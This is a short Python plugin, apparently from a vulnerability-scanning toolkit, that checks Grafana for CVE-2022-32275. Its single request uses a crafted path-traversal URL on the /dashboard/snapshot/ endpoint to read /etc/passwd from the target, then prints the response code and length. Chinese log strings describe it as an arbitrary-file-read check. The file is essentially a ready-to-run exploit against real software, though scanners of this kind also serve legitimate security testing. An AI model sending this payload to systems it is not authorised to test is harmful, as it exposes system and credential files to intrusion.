#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

class Cve_2022_32275:

    def run(self, urls):
        url = urls + "/dashboard/snapshot/%7B%7Bconstructor.constructor'/.. /.. /.. /.. /.. /.. /.. /.. /etc/passwd"
        response = requests.get(url, headers=self.header, verify=self.ssl, proxies=self.proxy)
        OutPrintInfo("Grafana",'是否存在漏洞需自行检测')
        OutPrintInfo("Grafana",f'URL: {url} 响应码:[b bright_red]{str(response.status_code)}[/b bright_red] 响应长度:[b bright_red]{str(len(response.text))}[/b bright_red]')

    def main(self, target):
        OutPrintInfo("Grafana",'开始执行Grafana任意文件读取检测')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]

        self.header, self.proxy = ReqSet(header=header, proxy=proxy)

        self.run(url)


        OutPrintInfo("Grafana",'Grafana任意文件读取检测结束')